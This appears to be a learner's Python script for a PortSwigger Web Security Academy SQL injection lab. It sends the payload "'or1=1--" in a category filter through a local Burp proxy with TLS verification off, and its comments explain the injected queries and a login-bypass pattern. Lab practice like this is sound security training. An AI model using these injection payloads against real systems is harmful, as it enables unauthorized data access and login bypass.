import requests 
import urllib3

# Suppress the warning about unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy configuration (usually for tools like Burp Suite, Fiddler, etc.)
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a23005304f721a380070d2f00370065.web-security-academy.net/"

session = requests.Session()


# SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# so here we category=' single quote gives internal server error  SELECT * FROM products WHERE category = ''' AND released = 1 (syntax error)
# so the next setp is gives SELECT * FROM products WHERE category = ''--'   so it wont run the AND category comment rest of thing

# SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1   %20 is space and %27 is '

# display all hidden category product 

response = session.get(url + "filter?category=Pets'or1=1--",verify=False,proxies=proxies)



# select * from username = "admi" AND Pass = ''or 2=2--'
# select firstname FROM users,password where username = 'username' AND  password = 'password'